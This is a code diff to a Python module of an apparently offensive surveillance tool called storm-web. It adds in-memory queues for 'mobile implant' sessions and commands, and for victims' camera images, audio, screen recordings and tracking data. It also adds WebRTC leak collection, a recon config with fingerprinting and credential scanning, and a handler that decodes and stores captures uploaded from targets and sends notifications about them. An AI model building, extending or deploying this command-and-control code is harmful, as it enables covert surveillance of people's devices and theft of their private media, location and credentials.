@@ -7,6 +7,7 @@ introduce a real ``StateStore`` interface here.
 """
 from __future__ import annotations
 
+import base64
 import json
 import os
 import re
@@ -17,6 +18,14 @@ from collections import defaultdict
 from datetime import datetime
 from pathlib import Path
 from typing import Any, Dict, Tuple
+
+# Sibling modules -- they live next to storm-web/app/ (one level up).
+import sys as _sys
+_PARENT = str(Path(__file__).resolve().parent.parent)
+if _PARENT not in _sys.path:
+    _sys.path.insert(0, _PARENT)
+from flask import jsonify, request  # noqa: E402
+import database as db  # noqa: E402
 
 
 STORM_WEB = Path(__file__).resolve().parent.parent
@@ -128,6 +137,31 @@ C2_FILE_LISTS: Dict[str, Any] = {}
 C2_DOWNLOADS: Dict[str, Any] = {}
 
 
+# === Mobile implant in-memory queues (verbatim from app.py:620-755) ========
+MOBILE_SESSIONS: Dict[str, Dict[str, Any]] = {}
+MOBILE_COMMANDS: Dict[str, Any] = {}
+MOBILE_RESPONSES: Dict[str, Any] = {}
+MOBILE_CAMERA_IMAGES: Dict[str, Any] = {}
+MOBILE_TRACKING_DATA: Dict[str, Any] = {}
+MOBILE_CAPTURE_DIRS: Dict[str, tuple] = {
+    'screenshot': ('images', 'jpg'),
+    'camera': ('images', 'jpg'),
+    'audio': ('sounds', 'webm'),
+    'screen_record': ('videos', 'webm'),
+}
+
+
+# === WebRTC + recon =========================================================
+WEBRTC_LEAKS: list = []
+RECON_CONFIG: Dict[str, Any] = {
+    'auto_fingerprint': True,
+    'auto_webrtc': True,
+    'auto_geofence_check': True,
+    'auto_credential_scan': False,
+    'auto_profile_build': True,
+}
+
+
 # === Notification fan-out (verbatim from app.py:344-353) ====================
 def send_notification(message_data: Dict[str, Any]) -> None:
     """Best-effort generic-webhook delivery if Settings.json has a URL."""
@@ -143,10 +177,67 @@ def send_notification(message_data: Dict[str, Any]) -> None:
         pass
 
 
+# === Mobile data:URL decoder (verbatim from app.py:650-662) =================
+def _decode_data_url(payload):
+    if not payload:
+        return None
+    if isinstance(payload, bytes):
+        payload = payload.decode("utf-8", "ignore")
+    if "," in payload:
+        payload = payload.split(",", 1)[1]
+    payload = payload.strip()
+    try:
+        return base64.b64decode(payload, validate=False)
+    except Exception:
+        return None
+
+
+# === Mobile capture persistence (verbatim from app.py:665-688) =============
+def _save_mobile_capture(uid, capture_type, field, extra_meta=None):
+    data = request.get_json(silent=True) or {}
+    raw = _decode_data_url(data.get(field))
+    if not raw:
+        return jsonify({"error": "No %s data provided" % field}), 400
+
+    subdir, ext = MOBILE_CAPTURE_DIRS[capture_type]
+    target_dir = os.path.join(BASE_DIR, subdir)
+    os.makedirs(target_dir, exist_ok=True)
+
+    fname = "mobile_%s_%s.%s" % (
+        capture_type, datetime.utcnow().strftime("%d%Y%H%M%S%f"), ext)
+    with open(os.path.join(target_dir, fname), "wb") as f:
+        f.write(raw)
+
+    url = "/%s/%s" % (subdir, fname)
+    meta = {"size": len(raw), "captured_at": data.get("timestamp")}
+    if data.get("url"):
+        meta["page_url"] = data.get("url")
+    if extra_meta:
+        meta.update(extra_meta)
+
+    db.save_mobile_capture(uid, capture_type, fname, url, meta)
+
+    send_notification({
+        "type": "Mobile Capture: %s" % capture_type,
+        "uid": uid,
+        "filename": fname,
+        "url": url,
+        "timestamp": datetime.now().isoformat()
+    })
+
+    return jsonify({"status": "saved", "filename": fname, "url": url,
+                    "size": len(raw)})
+
+
 __all__ = [
     "BASE_DIR", "PHP_CONFIG_PATH", "CHECK_C_PATH",
     "LOGIN_FAILS", "ANALYTICS", "CONFIG",
+    "C2_SESSIONS", "C2_COMMANDS", "C2_RESPONSES",
+    "C2_FILE_LISTS", "C2_DOWNLOADS",
+    "MOBILE_SESSIONS", "MOBILE_COMMANDS", "MOBILE_RESPONSES",
+    "MOBILE_CAMERA_IMAGES", "MOBILE_CAPTURE_DIRS", "MOBILE_TRACKING_DATA",
+    "WEBRTC_LEAKS", "RECON_CONFIG",
     "load_php_config", "load_check_c", "save_check_c",
     "generate_token", "change_token", "track_event",
-    "send_notification",
+    "send_notification", "_decode_data_url", "_save_mobile_capture",
 ]
